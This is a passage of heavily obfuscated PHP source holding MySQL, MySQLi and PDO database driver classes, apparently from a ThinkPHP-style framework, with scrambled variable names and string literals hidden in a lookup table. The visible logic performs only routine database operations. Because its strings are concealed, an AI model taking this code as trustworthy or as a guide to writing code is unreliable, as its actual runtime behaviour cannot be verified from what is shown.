($×ª¿‡Ã == $â´¼‚¤Å[12] || $×ª¿‡Ã == $â´¼‚¤Å[8]) { return !0; } $‹µ¯çÕ› = $this->_objectMeta($×ª¿‡Ã); return isset($‹µ¯çÕ›[$â´¼‚¤Å[33]]) && $‹µ¯çÕ›[$â´¼‚¤Å[33]] == $â´¼‚¤Å[78] ? !0 : !1; } } goto dœÒççõšˆ; C…±³ˆØ¬: class DbMysql extends Db { public function __construct($ÛùÓºş¥ = '') { $¬Å–áÆ =& $_SERVER[³Ôà×Ó]; if (!extension_loaded($¬Å–áÆ[879])) { think_exception(think_lang($¬Å–áÆ[14]) . $¬Å–áÆ[960]); } if (!empty($ÛùÓºş¥)) { $this->config = $ÛùÓºş¥; if (empty($this->config[$¬Å–áÆ[17]])) { $this->config[$¬Å–áÆ[17]] = $¬Å–áÆ[12]; } } } public function connect($¯ø¨Ê = '', $‘°®Ü = 0, $ÆÈÜËˆ˜ = false) { $‰Í‚õÅü =& $_SERVER[³Ôà×Ó]; if (!isset($this->linkID[$‘°®Ü])) { if (empty($¯ø¨Ê)) { $¯ø¨Ê = $this->config; } $—Ë¤å¼¡ = $¯ø¨Ê[$‰Í‚õÅü[961]] . ($¯ø¨Ê[$‰Í‚õÅü[962]] ? "\x3a{$¯ø¨Ê[$‰Í‚õÅü[962]]}" : $‰Í‚õÅü[12]); $ø¿—‡Òı = !empty($¯ø¨Ê[$‰Í‚õÅü[17]][$‰Í‚õÅü[18]]) ? $¯ø¨Ê[$‰Í‚õÅü[17]][$‰Í‚õÅü[18]] : $this->pconnect; if ($ø¿—‡Òı) { $this->linkID[$‘°®Ü] = mysql_pconnect($—Ë¤å¼¡, $¯ø¨Ê[$‰Í‚õÅü[963]], $¯ø¨Ê[$‰Í‚õÅü[964]], 131072); } else { $this->linkID[$‘°®Ü] = mysql_connect($—Ë¤å¼¡, $¯ø¨Ê[$‰Í‚õÅü[963]], $¯ø¨Ê[$‰Í‚õÅü[964]], !0, 131072); } if (!$this->linkID[$‘°®Ü] || !empty($¯ø¨Ê[$‰Í‚õÅü[21]]) && !mysql_select_db($¯ø¨Ê[$‰Í‚õÅü[21]], $this->linkID[$‘°®Ü])) { think_exception(mysql_error()); } $Øã‚¹¶ = mysql_get_server_info($this->linkID[$‘°®Ü]); mysql_query($‰Í‚õÅü[965] . think_config($‰Í‚õÅü[966]) . $‰Í‚õÅü[58], $this->linkID[$‘°®Ü]); if ($Øã‚¹¶ > $‰Í‚õÅü[967]) { mysql_query($‰Í‚õÅü[968], $this->linkID[$‘°®Ü]); } $this->connected = !0; if (1 != think_config($‰Í‚õÅü[22])) { unset($this->config); } } return $this->linkID[$‘°®Ü]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($—íŠÚÇÂ) { $¨Ù‰òÃé =& $_SERVER[³Ôà×Ó]; if (0 === stripos($—íŠÚÇÂ, $¨Ù‰òÃé[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—íŠÚÇÂ; if ($this->queryID) { $this->free(); } think_action_status($¨Ù‰òÃé[23], 1); think_status($¨Ù‰òÃé[24]); $this->queryID = mysql_query($—íŠÚÇÂ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¢¹Éİ™Ö) { $µá›öŸĞ =& $_SERVER[³Ôà×Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢¹Éİ™Ö; if ($this->queryID) { $this->free(); } think_action_status($µá›öŸĞ[25], 1); think_status($µá›öŸĞ[24]); $ ¹Ãşßø = mysql_query($¢¹Éİ™Ö, $this->_linkID); $this->debug(); if (!1 === $ ¹Ãşßø) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[³Ôà×Ó][969], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€°à‡†ú = mysql_query($_SERVER[³Ôà×Ó][970], $this->_linkID); $this->transTimes = 0; if (!$€°à‡†ú) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¾®Ûç¼˜ = mysql_query($_SERVER[³Ôà×Ó][971], $this->_linkID); $this->transTimes = 0; if (!$¾®Ûç¼˜) { $this->error(); return !1; } } return !0; } private function getAll() { $á£¿º‰£ = array(); if ($this->numRows > 0) { while ($³ÛÁÎÕÁ = mysql_fetch_assoc($this->queryID)) { $á£¿º‰£[] = $³ÛÁÎÕÁ; } mysql_data_seek($this->queryID, 0); } return $á£¿º‰£; } public function getFields($»¤«ê) { $á’¼ƒå„ =& $_SERVER[³Ôà×Ó]; $ñÏÈ›÷ = $this->query($á’¼ƒå„[972] . $this->parseKey($»¤«ê)); $½ªºŠÌ = array(); if ($ñÏÈ›÷) { foreach ($ñÏÈ›÷ as $ÈÙàœô => $ŞÒ†ÏÈ’) { $½ªºŠÌ[$ŞÒ†ÏÈ’[$á’¼ƒå„[31]]] = array($á’¼ƒå„[32] => $ŞÒ†ÏÈ’[$á’¼ƒå„[31]], $á’¼ƒå„[33] => $ŞÒ†ÏÈ’[$á’¼ƒå„[34]], $á’¼ƒå„[35] => (bool) (strtoupper($ŞÒ†ÏÈ’[$á’¼ƒå„[36]]) === $á’¼ƒå„[973]), $á’¼ƒå„[37] => $ŞÒ†ÏÈ’[$á’¼ƒå„[38]], $á’¼ƒå„[39] => strtolower($ŞÒ†ÏÈ’[$á’¼ƒå„[40]]) == $á’¼ƒå„[41], $á’¼ƒå„[42] => strtolower($ŞÒ†ÏÈ’[$á’¼ƒå„[43]]) == $á’¼ƒå„[44]); } } return $½ªºŠÌ; } public function getTables($üá†î•Ä = '') { $òÕØñÒğ =& $_SERVER[³Ôà×Ó]; if (!empty($üá†î•Ä)) { $©„íşß² = $òÕØñÒğ[974] . $üá†î•Ä . $òÕØñÒğ[975]; } else { $©„íşß² = $òÕØñÒğ[976]; } $Â©¸®¾® = $this->query($©„íşß²); $µŠŠü¼ô = array(); foreach ($Â©¸®¾® as $“€Ğê— => $»Âë¿Ÿ”) { $µŠŠü¼ô[$“€Ğê—] = current($»Âë¿Ÿ”); } return $µŠŠü¼ô; } public function replace($ğœ˜Ş‹±, $¼ÈçÓ›ï = array()) { $¹µ•úõ© =& $_SERVER[³Ôà×Ó]; foreach ($ğœ˜Ş‹± as $ÌìÊÈÀ€ => $–Œç¢«œ) { $Ü…Šè©Š = $this->parseValue($–Œç¢«œ); if (is_scalar($Ü…Šè©Š)) { $‹±¦ê½ [] = $Ü…Šè©Š; $©Ñ†çÆ²[] = $this->parseKey($ÌìÊÈÀ€); } } $ĞÜë—çŞ = $¹µ•úõ©[977] . $this->parseTable($¼ÈçÓ›ï[$¹µ•úõ©[356]]) . $¹µ•úõ©[978] . implode($¹µ•úõ©[50], $©Ñ†çÆ²) . $¹µ•úõ©[979] . implode($¹µ•úõ©[50], $‹±¦ê½ ) . $¹µ•úõ©[980]; return $this->execute($ĞÜë—çŞ); } public function insertAll($õú§×Ä´, $È­¡Ê×² = array(), $À»ÆÅ¦½ = false) { $„‡©”é« =& $_SERVER[³Ôà×Ó]; if (!is_array($õú§×Ä´[0])) { return !1; } $Î… = array_keys($õú§×Ä´[0]); $òËËÛè¾ = array(); foreach ($õú§×Ä´ as $â´×§ùØ) { $¬Ä¶ÏâÖ = array(); foreach ($â´×§ùØ as $œ¾Ä‰òÑ => $şùñÛàğ) { $şùñÛàğ = $this->parseValue($şùñÛàğ); if (is_scalar($şùñÛàğ)) { $¬Ä¶ÏâÖ[] = $şùñÛàğ; } } $òËËÛè¾[] = $„‡©”é«[337] . implode($„‡©”é«[50], $¬Ä¶ÏâÖ) . $„‡©”é«[980]; } array_walk($Î…, array($this, $„‡©”é«[981])); $ÇÈ˜îüü = ($À»ÆÅ¦½ ? $„‡©”é«[982] : $„‡©”é«[983]) . $„‡©”é«[984] . $this->parseTable($È­¡Ê×²[$„‡©”é«[356]]) . $„‡©”é«[978] . implode($„‡©”é«[50], $Î…) . $„‡©”é«[985] . implode($„‡©”é«[50], $òËËÛè¾); return $this->execute($ÇÈ˜îüü); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $§şÒğÑÂ =& $_SERVER[³Ôà×Ó]; $this->error = mysql_errno() . $§şÒğÑÂ[4] . mysql_error($this->_linkID); if ($§şÒğÑÂ[12] != $this->queryStr) { $this->error .= LNG($§şÒğÑÂ[48]) . $this->queryStr; } think_trace($this->error, $§şÒğÑÂ[12], $§şÒğÑÂ[49]); return $this->error; } public function escapeString($ÚÂ•†•°) { if ($this->_linkID) { return mysql_real_escape_string($ÚÂ•†•°, $this->_linkID); } else { return mysql_escape_string($ÚÂ•†•°); } } public function parseKey(&$…áåÅ¤©, $°Ó­ÏÃü = true) { $åá‹±ƒ =& $_SERVER[³Ôà×Ó]; if ($°Ó­ÏÃü) { $…áåÅ¤© = $this->parseKeyCheck($…áåÅ¤©); } if ($…áåÅ¤© != $åá‹±ƒ[220] && !preg_match($åá‹±ƒ[986], $…áåÅ¤©)) { $…áåÅ¤© = $åá‹±ƒ[470] . trim($…áåÅ¤©, $åá‹±ƒ[470]) . $åá‹±ƒ[470]; } return $…áåÅ¤©; } } class DbMysqli extends Db { public function __construct($˜œ÷Àıß = '') { $ùìœŞòË =& $_SERVER[³Ôà×Ó]; if (!extension_loaded($ùìœŞòË[987])) { think_exception(think_lang($ùìœŞòË[14]) . $ùìœŞòË[988]); } if (!empty($˜œ÷Àıß)) { $this->config = $˜œ÷Àıß; if (empty($this->config[$ùìœŞòË[17]])) { $this->config[$ùìœŞòË[17]] = $ùìœŞòË[12]; } } } public function connect($à¯»±‘õ = '', $Ş¹õ¶•ä = 0) { $ƒêÖêÛí =& $_SERVER[³Ôà×Ó]; if (!isset($this->linkID[$Ş¹õ¶•ä])) { if (empty($à¯»±‘õ)) { $à¯»±‘õ = $this->config; } $this->linkID[$Ş¹õ¶•ä] = new mysqli($à¯»±‘õ[$ƒêÖêÛí[961]], $à¯»±‘õ[$ƒêÖêÛí[963]], $à¯»±‘õ[$ƒêÖêÛí[964]], $à¯»±‘õ[$ƒêÖêÛí[21]], $à¯»±‘õ[$ƒêÖêÛí[962]] ? intval($à¯»±‘õ[$ƒêÖêÛí[962]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $×ğ­¸™÷ = $this->linkID[$Ş¹õ¶•ä]->server_version; $this->linkID[$Ş¹õ¶•ä]->query($ƒêÖêÛí[965] . think_config($ƒêÖêÛí[966]) . $ƒêÖêÛí[58]); if ($×ğ­¸™÷ > $ƒêÖêÛí[967]) { $this->linkID[$Ş¹õ¶•ä]->query($ƒêÖêÛí[968]); } $this->connected = !0; if (1 != think_config($ƒêÖêÛí[22])) { unset($this->config); } } return $this->linkID[$Ş¹õ¶•ä]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($èëÅï¡•) { $àîª»‹÷ =& $_SERVER[³Ôà×Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $èëÅï¡•; if ($this->queryID) { $this->free(); } think_action_status($àîª»‹÷[23], 1); think_status($àîª»‹÷[24]); $this->queryID = $this->_linkID->query($èëÅï¡•); if ($this->_linkID->more_results()) { while (($÷œ‰£ü = $this->_linkID->next_result()) != NULL) { $÷œ‰£ü->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¾Ç«ñ÷¨) { $›¿´íÊÀ =& $_SERVER[³Ôà×Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¾Ç«ñ÷¨; if ($this->queryID) { $this->free(); } think_action_status($›¿´íÊÀ[25], 1); think_status($›¿´íÊÀ[24]); $›²Ùâ¿Ø = $this->_linkID->query($¾Ç«ñ÷¨); $this->debug(); if (!1 === $›²Ùâ¿Ø) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $İ´“«Î = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$İ´“«Î) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ïÍ¤ıÂ· = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ïÍ¤ıÂ·) { $this->error(); return !1; } } return !0; } private function getAll() { $® ¾êÂ» = array(); if ($this->numRows > 0) { for ($³š®ûå = 0; $³š®ûå < $this->numRows; $³š®ûå++) { $® ¾êÂ»[$³š®ûå] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $® ¾êÂ»; } public function getFields($‡³§èÌ) { $ÔˆÛ¥Û· =& $_SERVER[³Ôà×Ó]; $€Ñ‚ò¾¡ = $this->query($ÔˆÛ¥Û·[972] . $this->parseKey($‡³§èÌ)); $ÁÍû½¤Ä = array(); if ($€Ñ‚ò¾¡) { foreach ($€Ñ‚ò¾¡ as $×™¹ÊÃ¿ => $¢µ¢ÍÔú) { $ÁÍû½¤Ä[$¢µ¢ÍÔú[$ÔˆÛ¥Û·[31]]] = array($ÔˆÛ¥Û·[32] => $¢µ¢ÍÔú[$ÔˆÛ¥Û·[31]], $ÔˆÛ¥Û·[33] => $¢µ¢ÍÔú[$ÔˆÛ¥Û·[34]], $ÔˆÛ¥Û·[35] => (bool) ($¢µ¢ÍÔú[$ÔˆÛ¥Û·[36]] === $ÔˆÛ¥Û·[12]), $ÔˆÛ¥Û·[37] => $¢µ¢ÍÔú[$ÔˆÛ¥Û·[38]], $ÔˆÛ¥Û·[39] => strtolower($¢µ¢ÍÔú[$ÔˆÛ¥Û·[40]]) == $ÔˆÛ¥Û·[41], $ÔˆÛ¥Û·[42] => strtolower($¢µ¢ÍÔú[$ÔˆÛ¥Û·[43]]) == $ÔˆÛ¥Û·[44]); } } return $ÁÍû½¤Ä; } public function getTables($¯Üî‹¥ = '') { $¡ŞĞó²Á =& $_SERVER[³Ôà×Ó]; $ƒçÃó– = !empty($¯Üî‹¥) ? $¡ŞĞó²Á[974] . $¯Üî‹¥ . $¡ŞĞó²Á[975] : $¡ŞĞó²Á[976]; $»’İôèÂ = $this->query($ƒçÃó–); $‰ë–ƒĞ = array(); if ($»’İôèÂ) { foreach ($»’İôèÂ as $˜‹Á±š£ => $¨‰ËÇñÌ) { $‰ë–ƒĞ[$˜‹Á±š£] = current($¨‰ËÇñÌ); } } return $‰ë–ƒĞ; } public function replace($¼›Òõ€, $œğ‚°éØ = array()) { $î€Á‚Åê =& $_SERVER[³Ôà×Ó]; foreach ($¼›Òõ€ as $¥µËº®û => $›š¾İÛÊ) { $œäâğ² = $this->parseValue($›š¾İÛÊ); if (is_scalar($œäâğ²)) { $Â´ÔÅ±ê[] = $œäâğ²; $áé¸î³ˆ[] = $this->parseKey($¥µËº®û); } } $”¨ğÈè™ = $î€Á‚Åê[977] . $this->parseTable($œğ‚°éØ[$î€Á‚Åê[356]]) . $î€Á‚Åê[978] . implode($î€Á‚Åê[50], $áé¸î³ˆ) . $î€Á‚Åê[979] . implode($î€Á‚Åê[50], $Â´ÔÅ±ê) . $î€Á‚Åê[980]; return $this->execute($”¨ğÈè™); } public function insertAll($ëñ¥Ïû˜, $³š†ß¹‡ = array(), $Øì¹ÀÜá = false) { $ËÑ˜¼¢É =& $_SERVER[³Ôà×Ó]; if (!is_array($ëñ¥Ïû˜[0])) { return !1; } $àç„üö = array_keys($ëñ¥Ïû˜[0]); $ê•úÙü¥ = array(); foreach ($ëñ¥Ïû˜ as $®×­âòÈ) { $²¸áƒßˆ = array(); foreach ($®×­âòÈ as $Å’Ì£ç => $Çª‹Ñù) { $Çª‹Ñù = $this->parseValue($Çª‹Ñù); if (is_scalar($Çª‹Ñù)) { $²¸áƒßˆ[] = $Çª‹Ñù; } } $ê•úÙü¥[] = $ËÑ˜¼¢É[337] . implode($ËÑ˜¼¢É[50], $²¸áƒßˆ) . $ËÑ˜¼¢É[980]; } array_walk($àç„üö, array($this, $ËÑ˜¼¢É[981])); $È„—½Ê• = $Øì¹ÀÜá ? $ËÑ˜¼¢É[982] : $ËÑ˜¼¢É[983]; $“òòÆè = $È„—½Ê• . $ËÑ˜¼¢É[984] . $this->parseTable($³š†ß¹‡[$ËÑ˜¼¢É[356]]) . $ËÑ˜¼¢É[978] . implode($ËÑ˜¼¢É[50], $àç„üö) . $ËÑ˜¼¢É[985] . implode($ËÑ˜¼¢É[50], $ê•úÙü¥); return $this->execute($“òòÆè); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $±Ã‚«§ =& $_SERVER[³Ôà×Ó]; $this->error = $this->_linkID->errno . $±Ã‚«§[4] . $this->_linkID->error; if ($±Ã‚«§[12] != $this->queryStr) { $this->error .= LNG($±Ã‚«§[48]) . $this->queryStr; } think_trace($this->error, $±Ã‚«§[12], $±Ã‚«§[49]); return $this->error; } public function escapeString($ğœì¸˜›) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ğœì¸˜›); } else { return addslashes($ğœì¸˜›); } } public function parseKey(&$„Ä¦å÷½, $Öı‹Ò«ş = true) { $û°Ç—›Ï =& $_SERVER[³Ôà×Ó]; if ($Öı‹Ò«ş) { $„Ä¦å÷½ = $this->parseKeyCheck($„Ä¦å÷½); } if ($„Ä¦å÷½ != $û°Ç—›Ï[220] && !preg_match($û°Ç—›Ï[986], $„Ä¦å÷½)) { $„Ä¦å÷½ = $û°Ç—›Ï[470] . trim($„Ä¦å÷½, $û°Ç—›Ï[470]) . $û°Ç—›Ï[470]; } return $„Ä¦å÷½; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Èñ¾Ï¬Œ = '') { $áë®£¸§ =& $_SERVER[³Ôà×Ó]; if (!class_exists($áë®£¸§[989])) { think_exception(think_lang($áë®£¸§[14]) . $áë®£¸§[990]); } if (!empty($Èñ¾Ï¬Œ)) { $this->config = $Èñ¾Ï¬Œ; if (empty($this->config[$áë®£¸§[17]])) { $this->config[$áë®£¸§[17]] = array(); } } } public function connect($çÀ–½£¢ = '', $ËŒòâˆú = 0) { $•ñ¢À¾™ =& $_SERVER[³Ôà×Ó]; if (!isset($this->linkID[$ËŒòâˆú])) { if (empty($çÀ–½£¢)) { $çÀ–½£¢ = $this->config; } $ŒÕŞÁúï = !empty($çÀ–½£¢[$•ñ¢À¾™[17]][$•ñ¢À¾™[18]]) ? $çÀ–½£¢[$•ñ¢À¾™[17]][$•ñ¢À¾™[18]] : $this->pconnect; if ($ŒÕŞÁúï) { $çÀ–½£¢[$•ñ¢À¾™[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ËŒòâˆú] = new PDO($çÀ–½£¢[$•ñ¢À¾™[991]], $çÀ–½£¢[$•ñ¢À¾™[963]], $çÀ–½£¢[$•ñ¢À¾™[964]], $çÀ–½£¢[$•ñ¢À¾™[17]]); } catch (PDOException $Ô¢ö¶ö) { think_exception($Ô¢ö¶ö->getMessage()); } $this->dbType = $this->_getDsnType($çÀ–½£¢[$•ñ¢À¾™[991]]); if (in_array($this->dbType, array($•ñ¢À¾™[992], $•ñ¢À¾™[993], $•ñ¢À¾™[994], $•ñ¢À¾™[995]))) { think_exception($•ñ¢À¾™[996] . $this->dbType . $•ñ¢À¾™[997] . $this->dbType . $•ñ¢À¾™[998]); } if (!$this->linkID[$ËŒòâˆú]) { think_exception($•ñ¢À¾™[999]); } try { $this->linkID[$ËŒòâˆú]->exec($•ñ¢À¾™[1000] . think_config($•ñ¢À¾™[966])); } catch (Exception $Ô¢ö¶ö) { } $this->connected = !0; if (1 != think_config($•ñ¢À¾™[22])) { unset($this->config); } } return $this->linkID[$ËŒòâˆú]; } public function free() { $this->PDOStatement = null; } public function query($×Ñ¥ÃŸ», $ëæâ¨¥ö = array()) { $»€ºõ­Å =& $_SERVER[³Ôà×Ó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×Ñ¥ÃŸ»; if (!empty($ëæâ¨¥ö)) { $this->queryStr .= $»€ºõ­Å[1001] . print_r($ëæâ¨¥ö, !0) . $»€ºõ­Å[1002]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($»€ºõ­Å[23], 1); think_status($»€ºõ­Å[24]); $this->PDOStatement = $this->_linkID->prepare($×Ñ¥ÃŸ»); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¹Êˆ§öç = $this->PDOStatement->execute($ëæâ¨¥ö); $this->debug(); if (!1 === $¹Êˆ§öç) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($›«î¾±¼, $ğ‰´ÄÏÉ = array()) { $‘‡ì¤™Ï =& $_SERVER[³Ôà×Ó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›«î¾±¼; if (!empty($ğ‰´ÄÏÉ)) { $this->queryStr .= $‘‡ì¤™Ï[1001] . print_r($ğ‰´ÄÏÉ, !0) . $‘‡ì¤™Ï[1002]; } $ëÉ–µ°÷ = !1; if ($this->dbType == $‘‡ì¤™Ï[995]) { if (preg_match($‘‡ì¤™Ï[1003], $this->queryStr, $¨ıÍ„Ï)) { $this->table = think_config($‘‡ì¤™Ï[1004]) . str_ireplace(think_config($‘‡ì¤™Ï[1005]), $‘‡ì¤™Ï[463], $¨ıÍ„Ï[2]); $ëÉ–µ°÷ = (bool) $this->query($‘‡ì¤™Ï[1006] . strtoupper($this->table) . $‘‡ì¤™Ï[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‘‡ì¤™Ï[25], 1); think_status($‘‡ì¤™Ï[24]); $this->PDOStatement = $this->_linkID->prepare($›«î¾±¼); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¬ÊÇ÷ú” = $this->PDOStatement->execute($ğ‰´ÄÏÉ); $this->debug(); if (!1 === $¬ÊÇ÷ú”) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ëÉ–µ°÷ || preg_match($‘‡ì¤™Ï[1007], $›«î¾±¼)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $øÁÎ¿ƒ = $this->_linkID->commit(); $this->transTimes = 0; if (!$øÁÎ¿ƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ã²ÖÔë = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ã²ÖÔë) { $this->error(); return !1; } } return !0; } private function getAll() { $¸Ÿä ÍÅ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¸Ÿä ÍÅ); return $¸Ÿä ÍÅ; } public function getFields($²½œ»£) { $ÚÚ’Ğ¸ =& $_SERVER[³Ôà×Ó]; $this->initConnect(!0); if (think_config($ÚÚ’Ğ¸[1008])) { $ï”ØÛáĞ = str_replace($ÚÚ’Ğ¸[1009], $²½œ»£, think_config($ÚÚ’Ğ¸[1008])); } else { switch ($this->dbType) { case $ÚÚ’Ğ¸[992]: case $ÚÚ’Ğ¸[1010]: $ï”ØÛáĞ = "\123\x45\x4c\x45\x43\124\40\x20\x20\143\x6f\154\165\x6d\x6e\x5f\x6e\141\x6d\x65\x20\x61\x73\x20\x27\116\141\155\x65\47\54\x20\40\x20\144\141\164\x61\x5f\164\171\160\x65\40\141\163\x20\x27\124\x79\x70\145\47\x2c\x20\x20\40\143\x6f\154\x75\x6d\x6e\137\x64\145\x66\141\x75\154\x74\40\141\x73\x20\x27\x44\x65\x66\x61\165\154\164\x27\x2c\x20\x20\40\151\163\x5f\156\x75\x6c\x6c\141\142\154\145\40\141\163\40\x27\x4e\165\154\x6c\47\12\x9\11\106\122\117\x4d\11\x69\x6e\146\157\x72\155\141\x74\151\157\156\x5f\163\x63\x68\145\155\x61\56\164\141\x62\x6c\145\163\x20\101\x53\x20\164\12\x9\11\x4a\x4f\x49\x4e\x9\x69\156\x66\x6f\162\x6d\141\x74\x69\x6f\x6e\x5f\163\143\150\x65\155\141\x2e\143\157\x6c\x75\155\x6e\x73\x20\x41\x53\x20\x63\12\x9\11\117\116\x20\40\x74\56\x74\x61\x62\x6c\x65\x5f\x63\x61\164\141\154\157\147\x20\75\x20\143\56\x74\141\x62\x6c\145\137\x63\x61\164\x61\x6c\157\x67\xa\11\11\101\116\104\40\164\x2e\164\x61\142\154\145\137\x73\143\x68\145\x6d\x61\40\x3d\x20\x63\x2e\164\x61\x62\x6c\145\x5f\163\143\x68\x65\155\141\xa\x9\x9\101\116\x44\x20\x74\x2e\x74\x61\x62\154\x65\x5f\x6e\141\155\145\40\x3d\40\x63\56\x74\x61\x62\154\145\137\156\x61\x6d\x65\12\x9\11\x57\x48\x45\x52\105\40\x20\40\x74\56\164\x61\142\154\145\137\156\x61\155\145\x20\x3d\40\x27{$²½œ»£}\47"; break; case $ÚÚ’Ğ¸[1011]: $ï”ØÛáĞ = $ÚÚ’Ğ¸[1012] . $²½œ»£ . $ÚÚ’Ğ¸[1013]; break; case $ÚÚ’Ğ¸[993]: case $ÚÚ’Ğ¸[995]: $ï”ØÛáĞ = $ÚÚ’Ğ¸[1014] . $ÚÚ’Ğ¸[1015] . $ÚÚ’Ğ¸[1016] . strtoupper($²½œ»£) . $ÚÚ’Ğ¸[1017] . strtoupper($²½œ»£) . $ÚÚ’Ğ¸[1018]; break; case $ÚÚ’Ğ¸[1019]: $ï”ØÛáĞ = $ÚÚ’Ğ¸[1020] . $²½œ»£ . $ÚÚ’Ğ¸[1021]; break; case $ÚÚ’Ğ¸[994]: break; case $ÚÚ’Ğ¸[1022]: default: $ï”ØÛáĞ = $ÚÚ’Ğ¸[1023] . ($this->dbType == $ÚÚ’Ğ¸[1022] ? "\140{$²½œ»£}\x60" : $²½œ»£); } } $£É˜š› = $this->query($ï”ØÛáĞ); $›ñ´Œƒ = array(); if ($£É˜š›) { foreach ($£É˜š› as $çŒ¶§ô½ => $œÈï™áÏ) { $œÈï™áÏ = array_change_key_case($œÈï™áÏ); $œÈï™áÏ[$ÚÚ’Ğ¸[32]] = isset($œÈï™áÏ[$ÚÚ’Ğ¸[32]]) ? $œÈï™áÏ[$ÚÚ’Ğ¸[32]] : $ÚÚ’Ğ¸[463]; $œÈï™áÏ[$ÚÚ’Ğ¸[33]] = isset($œÈï™áÏ[$ÚÚ’Ğ¸[33]]) ? $œÈï™áÏ[$ÚÚ’Ğ¸[33]] : $ÚÚ’Ğ¸[463]; $Ôãä¥¢‹ = isset($œÈï™áÏ[$ÚÚ’Ğ¸[350]]) ? $œÈï™áÏ[$ÚÚ’Ğ¸[350]] : $œÈï™áÏ[$ÚÚ’Ğ¸[32]]; $›ñ´Œƒ[$Ôãä¥¢‹] = array($ÚÚ’Ğ¸[32] => $Ôãä¥¢‹, $ÚÚ’Ğ¸[33] => $œÈï™áÏ[$ÚÚ’Ğ¸[33]], $ÚÚ’Ğ¸[35] => (bool) (isset($œÈï™áÏ[$ÚÚ’Ğ¸[106]]) && $œÈï™áÏ[$ÚÚ’Ğ¸[106]] === $ÚÚ’Ğ¸[12] || isset($œÈï™áÏ[$ÚÚ’Ğ¸[35]]) && $œÈï™áÏ[$ÚÚ’Ğ¸[35]] === $ÚÚ’Ğ¸[12]), $ÚÚ’Ğ¸[37] => isset($œÈï™áÏ[$ÚÚ’Ğ¸[37]]) ? $œÈï™áÏ[$ÚÚ’Ğ¸[37]] : (isset($œÈï™áÏ[$ÚÚ’Ğ¸[56]]) ? $œÈï™áÏ[$ÚÚ’Ğ¸[56]] : $ÚÚ’Ğ¸[463]), $ÚÚ’Ğ¸[39] => isset($œÈï™áÏ[$ÚÚ’Ğ¸[97]]) ? strtolower($œÈï™áÏ[$ÚÚ’Ğ¸[97]]) == $ÚÚ’Ğ¸[41] : (isset($œÈï™áÏ[$ÚÚ’Ğ¸[57]]) ? $œÈï™áÏ[$ÚÚ’Ğ¸[57]] : !1), $ÚÚ’Ğ¸[42] => isset($œÈï™áÏ[$ÚÚ’Ğ¸[1024]]) ? strtolower($œÈï™áÏ[$ÚÚ’Ğ¸[1024]]) == $ÚÚ’Ğ¸[44] : (isset($œÈï™áÏ[$ÚÚ’Ğ¸[97]]) ? $œÈï™áÏ[$ÚÚ’Ğ¸[97]] : !1)); } } return $›ñ´Œƒ; } public function getTables($ĞØõéÏ° = '') { $›™²†ä =& $_SERVER[³Ôà×Ó]; if (think_config($›™²†ä[1025])) { $ÇÔ”§Èû = str_replace($›™²†ä[1026], $ĞØõéÏ°, think_config($›™²†ä[1025])); } else { switch ($this->dbType) { case $›™²†ä[993]: case $›™²†ä[995]: $ÇÔ”§Èû = $›™²†ä[1027]; break; case $›™²†ä[992]: case $›™²†ä[1010]: $ÇÔ”§Èû = $›™²†ä[1028]; break; case $›™²†ä[1019]: $ÇÔ”§Èû = $›™²†ä[1029]; break; case $›™²†ä[994]: think_exception(think_lang($›™²†ä[1030]) . $›™²†ä[1031]); break; case $›™²†ä[1011]: $ÇÔ”§Èû = $›™²†ä[45] . $›™²†ä[46] . $›™²†ä[47]; break; case 